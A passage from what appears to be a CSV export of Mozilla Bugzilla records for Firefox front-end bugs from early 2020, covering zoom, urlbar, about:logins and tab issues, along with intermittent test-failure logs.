2020-01-28T05:50:30.904Z] 05:50:30 INFO - Entering test bound test_panelui_opened [task 2020-01-28T05:50:30.905Z] 05:50:30 INFO - TEST-PASS | browser/components/customizableui/test/browser_editcontrols_update.js | The panel is closed to begin with. - ""closed"" == ""closed"" - [tas"
1611903,"Zoom level is not applied correctly without a page refresh after changing ""Zoom text only"" option in about:preferences.",VERIFIED,P1,FIXED,"#### Affected versions: Nightly 74.0a1 (2020-01-28), Beta 73.0b10 #### Affected platforms: ALL #### Steps: 1. Launch Firefox with a new profile and go to about:preferences. 2. Under General, go to Zoom section and select 133% value (or any other) from the ""Default zoom"" dropdown. 3. Perform a zoom in or zoom out using ctrl + mousewheel and then click on the zoom level badge from the address bar in order to return to the default zoom level. 4. Check the ""Zoom text only"" checkbox and perform another zoom in or out like in step 3. #### Actual result: After checking the Zoom text only box and perform a zoom change using ctrl + mousewheel, the zoom level is applied for text only but starting from 100% instead from the default zoom level. #### Expected result: The zoom level should be applied starting from the default zoom level value set in step 2 (133% in our case). NOTE: After checking the ""Zoom text only"" option from step 4, if the user refresh the page it works ok, the zoom changes are applied starting from the default zoom value. Note that other checkbox options like ""Use smooth scrolling"" from Browsing section is applied immediately without refreshing the page. Also if I change th"
1611911,Respect Dark Mode when displaying text/plain documents,RESOLVED,--,DUPLICATE,I use dark mode in bugzilla and find it jaring when opening plain text attachments such as https://bug374050.bmoattachments.org/attachment.cgi?id=258658
1611920,icons overlap,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: did not wide window Actual results: icons overlap Expected results: hide"
1611929,Urlbar background-color does not align with the Photon colors,NEW,P3,,"The design update 1 Urlbar background-color is [`rgb(71, 71, 73)`](https://searchfox.org/mozilla-central/rev/cbd110d718bc89a499d3f996af24532abbf6f8ea/browser/themes/addons/dark/manifest.json#28). This is not a [Photon colour](https://design.firefox.com/photon/visuals/color.html#grey). The design update 1 spec calls for the Urlbar background to be Gray 60, but that reduces contrast too much. We can't make it Gray 70 because that's the colour of the toolbar. We maybe need something along the lines of a Gray 65."
1611930,Left-side Home toolbar button does not reliably overflow,RESOLVED,P2,FIXED,"When the Home button is in its default position in the toolbar next to the Refresh button, it does not reliably overflow when the window is small. This is probably true of any left-side toolbar button in Home's default position, although I haven't checked this. Dao identified that this seems to be caused by the [Urlbar sizing at small window widths](https://searchfox.org/mozilla-central/rev/cbd110d718bc89a499d3f996af24532abbf6f8ea/browser/base/content/browser.css#743,757,768). His work on bug 1610497 seems to improve the overflow behaviour, so we should check this again when that bug lands."
1611954,The zoom level is reset to the default value in normal window when the user reset the zoom in private browsing,NEW,--,,"#### Affected versions: Nightly 74.0a1 (2020-01-27), Beta 73.0b10 #### Affected platforms: ALL #### Steps: 1. Launch Firefox with a new profile, open a new private window and go to about:preferences. 2. Under General, go to Zoom section and select any value from the ""Default zoom"" dropdown e.g 150%. 3. Reach any website e.g www.facebook.com in the private window and change the zoom level manually to any level using ctrl + mousewheel or ctrl and ""+ , -"". 4. In the normal window access the same website like in private window (in our case www.facebook.com) and also change the zoom level manually to any level using ctrl + mousewheel or ctrl and ""+ , -"". 5. Go to the private window and click on the zoom level badge displayed in the address bar. 6. Go to the normal window and refresh the page. #### Actual result: When the user click on the zoom level badge in private window (step 5) and refresh the normal window page (step 6) the zoom level is reset to the default value also in normal window. #### Expected result: The zoom level in the normal window should not be reset when the user reset it in the private window."
1612001,"Can't use ""No Page Style"" on pages with embedded Google Maps",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I visited a page. Actual results: It embedded Google Maps. Google Maps zoomed on loading. My brain is currently migraining. I tried to inspect element to try to find a way to block Google Maps, or keep it from firing animation. I was unable to inspect element. No right-click menu. I reloaded with No Page Style. Instead of a readable page, I got a giant Google Map. Google maps started animated scrolling. Expected results: Google shouldn't fire migraine-inducing pain-imation, but as long as they continue to do so, Firefox should allow users to inspect elements and block them."
1612010,Firefox 72 bookmark star not in URL bar,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. browse to a URL e.g. nu.nl 2. since 72 there is no star in the URL field, to save nu.nl as a bookmark it is necessary to click on the three dots and select the option (star) 'create a bookmark' (on my computer Firefox is installed in the Dutch language and I'm not completely sure of the English equivalent) Actual results: After action 2 the bookmark is saved. However, only the three dots are displayed, no (blue) star. To find out if a URL has already been saved as a bookmark, it is necessary to click on the three dots after which there will be displayed either 'edit this bookmark' or 'create a bookmark'. Expected results: It should work as it did before the upgrade to Firefox 72 i.e.: - if the URL has not been saved as a bookmark, the star in the URL field will be colourless / not-filled. - if the URL has already been saved, the star will be blue / filled. This logic obviates the need to use the three dots unless other options are required."
1612030,"Window preview is empty with a rotating circle when ""Show tab previews"" option is enabled.",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Check ""Show tab previews in the Windows taskbar"" in Options. Place the mouse over a tab preview and wait. Actual results: An empty window with a rotating circle at the centre is showing. Expected results: The window should be shown in its full size (works that way for other applications)."
1612045,"""Use Current Pages"" is wrongly active even if no new tabs are opened",NEW,P3,,"**[Affected versions]:** - Firefox 74.0a1 Build ID 20200128214036 - Firefox 73.0b10 Build ID 20200125104833 - Firefox 72.0.2 Build ID 20200117190643 **[Affected Platforms]:** - Windows 10 - Mac 10.14 - Linux Debian 9 **[Prerequisites]:** - Have only one tab opened. **[Steps to reproduce]:** 1. Open about:preferences#home page in the same tab. 2. From the ""Homepage and new window"" dropdown select ""Custom URLs..."" option. 3. Observe the ""Use Current Pages"" button. **[Expected result]:** - ""Use Current Pages"" button is inactive. **[Actual result]:** - ""Use Current Pages"" button is active. **[Additional notes]:** - After a few clicks the button turns inactive. - The button is activated back after the ""Use Bookmark"" action is used."
1612056,[lockwise] Tooltip for Show/Hide password button is missing in about:logins page,RESOLVED,--,INVALID,"**Affected versions** * 73.0b11, 74.0a1(2020-01-28); **Affected platforms** * Win7/10, Ubuntu 18.04, macOS 10.15; **Steps to reproduce** 1. Launch Firefox and access about:lockwise 2. Create a new login - or have one created already; 3. Click any login and hover over the Show/Hide password button; 4. Click that button; 5. Move the mouse away, hover over it again; **Expected result** * Show/Hide password tooltip is displayed; **Actual result** * Show/Hide password tooltip is not displayed; **Regression range** * will provide one asap; * 72.0.2 not affected; **Additional notes** * same result when hovering on the available button on the edit/create scenarios; * marking bug as minor, since this is a small UX issue."
1612058,[L10n] about:newtab search field does not list search suggestions in RTL when using a LTR language,NEW,P2,,**[Affected versions]:** - Firefox 74.0a1 Build ID 20200128214036 - Firefox 73.0b10 Build ID 20200125104833 - Firefox 72.0.2 Build ID 20200117190643 **[Affected Platforms]:** - Windows 10 - Mac 10.14 - Linux Debian 9 **[Prerequisites]:** - Have an “ar” Firefox build installed. **[Steps to reproduce]:** 1. Open about:newtab page. 2. Type a search keyword in the search field using a LTR language. 3. Observe the search suggestions. **[Expected result]:** - Search suggestions are displayed on the right side. **[Actual result]:** - Search suggestions are displayed on the left side. **[Additional notes]:** - This is not reproducible if the search is performed from Awesome bar or toolbar search. - This issue is not reproducible using a RTL language. - This issue might not be encountered in real life scenarios.
1612084,Right click opens shows context menu and opens link,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open any web page with a link and right click on it. Actual results: The context menu opens briefly and the link imnediatelly opens in a new tab. Expected results: The context menu stays open and no other action is done.
1612102,Intermittent browser/base/content/test/general/browser_bug417483.js | Uncaught exception received from previously timed out test - at general/browser_bug417483.js:39 - ReferenceError: ok is not defined,RESOLVED,P5,INCOMPLETE,"**Filed by:** apavel [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286846437&repo=try **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/EWGHSCV7SW-QNa8jONH72w/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-29T12:17:16.759Z] 12:17:16 INFO - TEST-START | browser/base/content/test/general/browser_bug417483.js [task 2020-01-29T12:17:16.797Z] 12:17:16 INFO - GECKO(10196) | JavaScript error: resource:///actors/ContextMenuChild.jsm, line 567: TypeError: doc is null [task 2020-01-29T12:17:16.999Z] 12:17:16 INFO - GECKO(10196) | JavaScript error: , line 0: uncaught exception: [fluent][resolver] errors in en-US/file-dd: ReferenceError: Unknown variable: $pluginLibraries. [task 2020-01-29T12:18:01.781Z] 12:18:01 INFO - TEST-INFO | started process screenshot [task 2020-01-29T12:18:01.860Z] 12:18:01 INFO - TEST-INFO | screenshot: exit 0 [task 2020-01-29T12:18:01.860Z] 12:18:01 INFO - Buffered messages logged at 12:17:16 [task 2020-01-29T12:18:01.860Z] 12:18:01 INFO - Entering test bound [task 2020-01-29T12:18:01.860Z] 12:18:01 INFO - Console message: [JavaScript Error: ""The character encoding of the HTML document"
1612104,Part of the download start animation is missing / cut off,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Start downloading a file Actual results: No start animation was played Expected results: There's should be start animation like in previous versions. I don't know when this stops working but I downloaded firefox version 57 and this animation is present. Also checked fresh installation of firefox 72.0.2 with same result - no animation. I attach gif of what this animation looks like in firefox 57.
1612108,Onboarding Triplets can be wrongly dismissed from about:welcome page while the onboarding modal is still displayed,VERIFIED,P1,FIXED,"**[Affected versions]:** - Firefox 73.0b11 Build-ID 20200128001646 **[Affected Platforms]:** - Windows 10 - Mac 10.14 - Linux Debian 9 **[Steps to reproduce]:** 1. Open about:welcome page. 2. Observe the top-right side of the page. **[Expected result]:** - A grayed out and unactionable “X” button is displayed. **[Actual result]:** - An actionable “X” button is displayed. **[Regression]:** - Last good revision: 63822634f6ffb878bd3aa64c1789b3452d178bee - First bad revision: 0152641c5419db9c9e723afe55bef1b63c699e96 Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=63822634f6ffb878bd3aa64c1789b3452d178bee&tochange=0152641c5419db9c9e723afe55bef1b63c699e96 **[Additional notes]:** - The onboarding Triplets are dismissed if the “X” button is clicked. - This issue was fixed on Firefox Nightly 74.0a1 (Build 20200129093157) by Bug 1609462. @thecount, @pdahiya could you please take a look at Bug 1609462 and see if it will be safe to be uplifted in Beta?"
1612122,Copy / Cut options from context menu are available on empty searchbar,VERIFIED,P3,FIXED,"**Affected versions** - Firefox 74.0a1 - Firefox 73.0b11 - Firefox 72.0 **Affected platforms** - Windows 10 & 7 - macOS 10.13 - Ubuntu 18.04 **Steps to reproduce** 1. Open Firefox and go to Options / Preferences 2. Enable the search bar 3. Right click on the added search bar **Expected result** - The copy / cut options are greyed out as there is no input text **Actual result** - The copy / cut options are available **Regression range** - I will see for a regression. On a look over, 69.0b8 seems to not be affected, but 71.0 is affected. **Additional notes** - The behavior can be seen in the attachment - Context menu options both in pages and the search bar from toolbar are affected by this issue. - A page affected by this is [example](https://www.roboform.com/filling-test-all-fields). - 68.4.2esr is affected too. - If considered, a separate bug should be opened for the issue on pages, as opposed to just the search bar."
1612206,Ensure maybeReloadEngines is not missed,RESOLVED,P1,FIXED,Spinning this out of https://bugzilla.mozilla.org/show_bug.cgi?id=1589618
1612218,Using sync imports logins but doesn't remove them when user signs out of Firefox.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I signed into Firefox sync and my logins were downloaded to this device. I used the browser for a few months and then signed out out my Firefox account. Actual results: After signing out of my Firefox accounts, all of my logins were still present. Expected results: The logins should have been deleted since they came as a result of signing in to Firefox, but they stayed on the device."
1612228,Intermittent browser/components/urlbar/tests/browser/browser_search_tips.js | Test timed out -,RESOLVED,P5,FIXED,"**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286901317&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/TPDyzhkZSWiAmfwO48ODrw/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/TPDyzhkZSWiAmfwO48ODrw/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- [task 2020-01-29T21:55:44.965Z] 21:55:44 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_search_tips.js | Default engine should be Google. - ""Google"" == ""Google"" - [task 2020-01-29T21:55:44.966Z] 21:55:44 INFO - Leaving test bound init [task 2020-01-29T21:55:44.967Z] 21:55:44 INFO - Entering test bound newtab [task 2020-01-29T21:55:44.968Z] 21:55:44 INFO - Buffered messages finished [task 2020-01-29T21:55:44.970Z] 21:55:44 INFO - TEST-UNEXPECTED-FAIL | browser/components/urlbar/tests/browser/browser_search_tips.js | Test timed out - [task 2020-01-29T21:55:44.972Z] 21:55:44 INFO - TEST-PASS | browser/components/urlbar/t"
1612254,"Keyboard shortcut (cmd + ,) does not create subscript as it does in other browsers",VERIFIED,P2,FIXED,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Reproduction: 1. Open Firefox 2. Go to drive.google.com 3. Open document in Google docs 4. Highlight character in google docs (such as the ""2"" in H20) 5. Press command + , (comma) Actual results: Command + , opens a new tab in firefox - about:preferences Expected results: Highlighted character should turn into a subscript (this works in google docs in other browsers and is listed as the proper shortcut for a subscript; superscript, command + . works)"
1612261,PDF.js does not render borders consistently,RESOLVED,P3,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Opened attached PDF in Firefox, Chrome, and Adobe Reader DC Actual results: If you scroll to the bottom and see that there is a line under ""Saturday 22 December 2018"" in Chrome and Adobe Acrobat Reader, but not in Firefox. Expected results: Firefox, Chrome and Adobe Reader DC should all display consistently."
1612268,dragging a tab after restarting firefox not possible while tab is still loading,RESOLVED,P3,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Close firefox with saving the current opened tabs. Start Firefox, now move mouse cursor to a tab that's not (re)loaded yet, then hold left mousbutton and try to drag it left or right (over another tab). Actual results: not working"
1612397,menu bar don't want to disappear any more (if alt-key is pressed),RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: press the alt-key Actual results: the menu bar don't want to disappear Expected results: the menu bar should disappear
1612403,File extensions are duplicated for file inputs with custom 'accept',RESOLVED,P2,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox 72 on Windows 7 and Windows 10. Given a file input element with a custom 'accept' attribute: <input type=""file"" name=""file"" accept=""application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,text/plain"" multiple=""multiple""> Actual results: When clicked, a file dialog is displayed where the file extensions are duplicated in both the ""All supported types"" item and in the individual file type items (see screenshot): All Supported Types (*.pdf;*.pdf;*.doc;*.doc;*.docx;*.docx;*.xls;*.xls;*.xlsx;*.xlsx;*.txt*.txt) Adobe Acrobat Document (*.pdf;*.pdf) Microsoft Word 97 - 2003 Document (*.doc;*.doc) Microsoft Word Document (*.docx;*.docx) Microsoft Excel 97-2003 Worksheet (*.xls;*.xls) Microsoft Excel Worksheet (*.xlsx;*.xlsx) Text Document (*.txt;*.txt) Expected results: File extensions in the file types list are not duplicated: All Supported Types (*.pdf; *.doc; *.docx; *.xls; *.xlsx; *.txt) Adobe Acrobat Document (*.pdf) Microsoft Wor"
1612418,Screenshot - Prevent page refresh when do screenshot take,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: - Open NHS no-break monitoring page - Try to take a screenshot - Get error in screenshot - The page redirects when you crop the page Actual results: - Page refresh when crop screenshot image - Get a tool error Expected results: Freeze page refresh. Or freeze image when crop.
1612425,Bookmark-Folders unresponsive on macos 10.15.3 after moving Firefox on different virtual desktop,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Create multiple virtual Desktops on macOS 10.15.3 2. Open Firefox window with Bookmark Folders in Bookmark-Toolbar 3. Click on several Folders -> works, content is shown 4. Move Firefox-Window on different virtual Desktop 5. Click on several Folders -> fail, no content shown or only on the first click, repeated clics on the same folder have no effect Actual results: see abobe: multiple clicks on bookmark folders have no effect if the browser window has been moved to a different virtual desktop on the latest release of macOS 10.15.3 Expected results: folders should work like before having moved the browser window to a different desktop"
1612427,"Intermittent browser/components/customizableui/test/browser_947914_button_zoomReset.js | Button displays the correct zoom level - Got 100, expected 50",RESOLVED,--,FIXED,"**Filed by:** dvarga [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286999580&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/EdpxUHnaR3ep717Lt7uYmQ/runs/0/artifacts/public/logs/live_backing.log --- ``` [task 2020-01-30T16:58:08.737Z] 16:58:08 INFO - TEST-PASS | browser/components/customizableui/test/browser_947914_button_zoomReset.js | Page zoom reset correctly - [task 2020-01-30T16:58:08.737Z] 16:58:08 INFO - Buffered messages finished [task 2020-01-30T16:58:08.738Z] 16:58:08 INFO - TEST-UNEXPECTED-FAIL | browser/components/customizableui/test/browser_947914_button_zoomReset.js | Button displays the correct zoom level - Got 100, expected 50 [task 2020-01-30T16:58:08.738Z] 16:58:08 INFO - Stack trace: [task 2020-01-30T16:58:08.738Z] 16:58:08 INFO - chrome://mochikit/content/browser-test.js:test_is:1320 [task 2020-01-30T16:58:08.738Z] 16:58:08 INFO - chrome://mochitests/content/browser/browser/components/customizableui/test/browser_947914_button_zoomReset.js:null:35 [task 2020-01-30T16:58:08.738Z] 16:58:08 INFO - chrome://mochikit/content/browser-test.js:Tester_execTest/<:1062 [task 2020-01-30T1"
1612452,Intermittent [tier2] browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | Test timed out -,RESOLVED,P5,INCOMPLETE,"**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287016383&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/SbFlBAwUT_6Np2FbnF3XNA/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/SbFlBAwUT_6Np2FbnF3XNA/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- task 2020-01-30T21:07:44.394Z] 21:07:44 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | extra[selType] must match in event urlbar#engagement#paste_go. - ""none"" matches ""none"" - [task 2020-01-30T21:07:44.394Z] 21:07:44 INFO - Running test at index 15 [task 2020-01-30T21:07:44.394Z] 21:07:44 INFO - Open the panel with DOWN, select with DOWN, Enter. [task 2020-01-30T21:07:44.395Z] 21:07:44 INFO - Console message: [JavaScript Error: ""uncaught exception: out of memory""] [task 2020-01-30T21:07:44.395Z] 21:07:44 INFO - Console message: [JavaScript Error: ""uncaught exception: out of memory""] [task 20"
1612457,Intermittent [TV] browser/components/newtab/test/browser/browser_asrouter_trigger_listeners.js | Test timed out -,RESOLVED,P5,FIXED,"**Filed by:** dvarga [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287020907&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/WK5NTECDRYW8p8QiBxy4hA/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/WK5NTECDRYW8p8QiBxy4hA/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- ``` [task 2020-01-30T22:29:56.210Z] 22:29:56 INFO - Buffered messages logged at 22:29:11 [task 2020-01-30T22:29:56.210Z] 22:29:56 INFO - Console message: [JavaScript Error: ""Unknown Collection ""main/whats-new-panel"""" {file: ""resource://services-settings/RemoteSettingsClient.jsm"" line: 167}] [task 2020-01-30T22:29:56.210Z] 22:29:56 INFO - UnknownCollectionError@resource://services-settings/RemoteSettingsClient.jsm:167:5 [task 2020-01-30T22:29:56.211Z] 22:29:56 INFO - sync@resource://services-settings/RemoteSettingsClient.jsm:403:13 [task 2020-01-30T22:29:56.211Z] 22:29:56 INFO - async*get@resource://services-settings/RemoteSettingsCl"
1612468,Firefox gives content-free error message if XUL errors are disabled and SSL error is encountered,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: 1. Go into about:config 2. Set browser.xul.error_pages.enabled to false 3. Clear caches or perform some other action that ensures the site in step 4 is not cached 4. Go to a site that will trigger a recoverable SSL error, for example https://www.tpsgc-pwgsc.gc.ca Actual results: A dialog box with no error message appears. Expected results: There should be an error message in the dialog box."
1612473,"Intermittent browser/extensions/doh-rollout/test/unit/test_localStorageMigration.js | testLocalStorageMigration - [testLocalStorageMigration : 123] doh-rollout.doneFirstRun pref exists and has the right value true - ""undefined"" == true",RESOLVED,P5,INCOMPLETE,"**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287034005&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/JGs9yn5AS8G2J7oL7u2D2A/runs/0/artifacts/public/logs/live_backing.log --- task 2020-01-31T01:43:35.565Z] 01:43:35 INFO - PID 25116 | 1580435015033 addons.xpi DEBUG Calling bootstrap method startup on doh-rollout@mozilla.org version 1.3.0 [task 2020-01-31T01:43:35.565Z] 01:43:35 INFO - ""CONSOLE_MESSAGE: (info) 1580435015033 addons.xpi DEBUG Calling bootstrap method startup on doh-rollout@mozilla.org version 1.3.0"" [task 2020-01-31T01:43:35.566Z] 01:43:35 INFO - PID 25116 | 1580435015262 addons.xpi DEBUG Install of temporary addon in /builds/worker/workspace/build/application/firefox/browser/features/doh-rollout@mozilla.org.xpi completed. [task 2020-01-31T01:43:35.566Z] 01:43:35 WARNING - TEST-UNEXPECTED-FAIL | browser/extensions/doh-rollout/test/unit/test_localStorageMigration.js | testLocalStorageMigration - [testLocalStorageMigration : 123] doh-rollout.doneFirstRun pref exists and has the right value true - ""undefined"" == true [task 2020-01-31T01:43:35.566Z] 01:43:35 INFO - /bu"
1612491,Intermittent Last test finished | application terminated with exit code 1 | application crashed [@ MD4Transform + 0x1f13e],RESOLVED,P5,INCOMPLETE,"**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287068126&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/U_Oyrhs8QG2_77Br33vCFg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-31T07:13:32.648Z] 07:13:32 INFO - TEST-START | browser/base/content/test/tabcrashed/browser_withoutDump.js [task 2020-01-31T07:13:32.955Z] 07:13:32 INFO - GECKO(6004) | Et tu, Brute? [task 2020-01-31T07:13:33.219Z] 07:13:33 INFO - GECKO(6004) | [Parent 5436, Gecko_IOThread] WARNING: file z:/task_1580448011/build/src/ipc/chromium/src/base/process_util_win.cc, line 160 [task 2020-01-31T07:13:33.239Z] 07:13:33 INFO - GECKO(6004) | about:tabcrashed loaded and ready [task 2020-01-31T07:13:34.914Z] 07:13:34 INFO - GECKO(6004) | Crash cleaned up [task 2020-01-31T07:13:34.957Z] 07:13:34 INFO - GECKO(6004) | MEMORY STAT | vsize 772MB | vsizeMaxContiguous 582MB | residentFast 221MB | heapAllocated 110MB [task 2020-01-31T07:13:34.957Z] 07:13:34 INFO - TEST-OK | browser/base/content/test/tabcrashed/browser_withoutDump.js | took 2312ms [task 2020-01-31T07:13:34.977Z] 07:13:34 INFO - checking window"
1612498,Do not animate without moving mouse,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Edg/79.0.309.71 Steps to reproduce: html and click the button. There is an animation in which css repeats hide () and show (). There are several such cartoons. *Use common css animation Actual results: The firefox only works with 1 of them (be thought that). If you move the mouse, the other animation moves. Expected results: Don't you do something like refrain from rendering until you move the mouse? I want you to render everything."
1612509,System Highlight colour is not respected for the Urlbar result highlight in Dark theme,RESOLVED,P3,FIXED,"In default/light mode, we support using the system Highlight colour as the background colour for selected Urlbar results. In Dark Mode it is always blue."
1612514,open a different containter ( long click on '+' ) is broken,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: long click on '+' tab Actual results: nothing Expected results: open the list of the different containers
1612521,"""no logins found"" displayed while the page is loading",VERIFIED,--,FIXED,"Before the page has finished loading, we erroneously show ""no logins found"". The simple fix is to hide any message to the user until we know how many logins the user has."
1612522,Tracking Protection Shield inactive after going back to a previous page,NEW,P3,,"**Affected versions** - Firefox 72.0.2 - Firefox 73.0b11 - Firefox 74.0a1 **Affected platforms** - Windows 10 & 7 - macOS 10.15 - Ubuntu 18.04 **Steps to reproduce** 1. Launch Firefox 2. Access this [link](https://senglehardt.com/test/trackingprotection/test_pages/tracking_protection) 3. Now access this [link](https://senglehardt.com/test/trackingprotection/test_pages/fingerprinting.html) in the same tab. 4. Go back to the previous page **Expected result** - The tracking protection shield is active and blocking **Actual result** - The tracking protection shield is inactive and ""No trackers known to Firefox/Nightly were detected on this page"" message is shown **Regression range** I will see for a regression **Additional notes** - The issue can be seen in the attachment. - By doing the steps and refreshing the page after, the tracking protection will be active again."
1612530,non standard port in url prevents popup whitelist GPO application and tagging,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Set up a Computer GPO to whitelist our internal company domain in the popup blocker, in the following format : https://domain.tld http://domain.tld Actual results: The GPO applies properly, both exceptions are listed in the browser settings and the whitelist works fine on all standard URLs. However, when we try to access a server with the following url format, the setting is ignored and the popup blocker is active : http(s)://server.domain.tld:portnumber If we try to set up a specific exception for this server in the GPO by adding http(s)://server.domain.tld:portnumber to the whitelist, the entry isn't added by firefox either after proper GPO sync and browser relaunch. Adding the exception manually in about:preferences works. Expected results: The popup exceptions in Firefox should tag urls properly no matter which port is specified for the given whitelisted domain. The Computer GPO for popup whitelisting should allow for non standard ports to be specified."
1612558,"Up and download pictures results FF-crashes (multiple Homepages, often at amazon by creat new product-offer)",RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. download picture from homepage / e-shop 2. upload picture at amazon (create a product-offer) Actual results: FF crashes before picture-down - or upload ready Expected results: picture-down - or upload must go successfull
1612588,_adjustFocusAfterTabSwitch can run before or after TabSelect,NEW,P2,,"For Bug 1601052 I'm implementing a workaround where I have to wait for both TabSelect and the focus change, to be sure we touch the urlbar at the right time after a tab switch. This happens more often when switching tabs repeatedly, the TabSelect event normally fires after _adjustFocusAfterTabSwitch, but sometimes it fires before it, so we get a TabSelect and then the focus changes to/from the urlbar. Having a reliable timeline would help with implementing features, and it's unclear if this may be a cause for intermittent failures."
1612596,Firefox ESR UserAgent String reports wrong Firefox Version,RESOLVED,--,INVALID,"+++ This bug was initially created as a clone of Bug #832423 +++ User Agent was taken from: http://browser-update.org/test/bar.html User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5) Gecko/20100101 Firefox/60.5 Steps to reproduce: In Firefox 72.0.2, the user agent string is similar to the following: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5) Gecko/20100101 Firefox/60.5 OS: MacOS (10.15.1) Beta Actual results: Firefox version is not. Which some features of Github will not load because of ""Old browser version"" Expected results: Firefox/60.5 should read Firefox/72.0"
